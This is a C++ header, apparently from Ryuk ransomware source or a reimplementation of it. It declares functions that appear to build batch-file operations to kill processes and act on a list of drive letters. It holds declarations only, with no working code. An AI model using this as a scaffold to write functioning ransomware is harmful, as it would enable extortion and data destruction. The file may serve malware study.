#ifndef RYUK_BAT_ACTIONS_H_
#define RYUK_BAT_ACTIONS_H_

#include <codecvt>
#include <cstdio>
#include <locale>
#include <string>
#include <vector>

#include <tchar.h>
#include <windows.h>

namespace ryuk {

    static inline void ReplaceAll(std::wstring& str, const std::wstring& from, const std::wstring& to);

    void KillBATOperations(std::vector<std::wstring>* driveLetters);

    void WindowBATOperations(std::vector<std::wstring>* driveLetters);

} // namespace ryuk

#endif RYUK_BAT_ACTIONS_H_
